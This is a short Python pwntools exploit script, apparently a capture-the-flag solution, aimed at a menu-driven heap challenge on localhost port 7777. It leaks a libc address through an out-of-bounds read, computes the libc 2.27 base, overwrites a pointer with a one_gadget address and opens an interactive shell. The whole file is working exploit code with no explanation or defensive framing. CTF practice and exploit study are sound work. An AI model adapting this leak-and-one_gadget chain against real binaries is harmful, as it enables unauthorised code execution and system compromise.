from pwn import *

p = remote('localhost', 7777)
libc = ELF('libc-2.27.so')

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def new(i, size, data):
    p.sendlineafter('> ', '1')
    p.sendlineafter('index: ', str(i))
    p.sendlineafter('size: ', str(size))
    p.sendlineafter('data: ', data)

def show(i):
    p.sendlineafter('> ', '2')
    p.sendlineafter('index: ', str(i))
    p.recvuntil('data: ')
    return p.recvline()[:-1]

p.sendlineafter('n: ', str(0xffff))

new(0, 0x18, '')

libc.address = u64(show(28).ljust(8, b'\x00')) - 0x199e10
print(hex(libc.address))

new(6, 0x18, b'A' * 0x8 + p64(libc.address + one_gadget[0]))

p.sendlineafter('> ', '0')

p.interactive()
